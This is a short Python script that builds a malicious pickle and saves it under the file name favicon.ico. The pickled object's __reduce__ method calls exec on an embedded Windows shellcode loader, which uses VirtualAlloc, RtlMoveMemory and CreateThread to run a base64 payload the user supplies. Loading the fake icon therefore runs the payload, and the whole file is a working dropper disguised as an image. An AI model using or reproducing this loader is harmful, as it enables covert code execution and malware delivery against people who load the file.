# !/usr/bin/env python
# -*-coding:utf-8 -*-

"""
# File: pickle_to_img.py
# Time：2022/5/27 22:45
# Author：iloveflag@outlook.com
# version：Python 3.8.0 (tags/v3.8.0:fa919fd, Oct 14 2019, 19:21:23) [MSC v.1916 32 bit (Intel)] on win32
# Github：https://github.com/iloveflag
"""

import pickle

shellcode = """
import base64
import ctypes
import codecs
shellcode= "***base64 your shellcode and put!***"
shellcode = base64.b64decode(shellcode)
shellcode = codecs.escape_decode(shellcode)[0]
shellcode = bytearray(shellcode)
ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),
                                          ctypes.c_int(len(shellcode)),
                                          ctypes.c_int(0x3000),
                                          ctypes.c_int(0x40))

buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)

ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr),
                                     buf,
                                     ctypes.c_int(len(shellcode)))

ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),
                                         ctypes.c_int(0),
                                         ctypes.c_int(ptr),
                                         ctypes.c_int(0),
                                         ctypes.c_int(0),
                                         ctypes.pointer(ctypes.c_int(0)))

ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht), ctypes.c_int(-1))
"""


class A(object):
    def __reduce__(self):
        return (exec, (shellcode,))


ret = pickle.dumps(A())
with open("favicon.ico", 'wb') as img:
    img.write(ret)
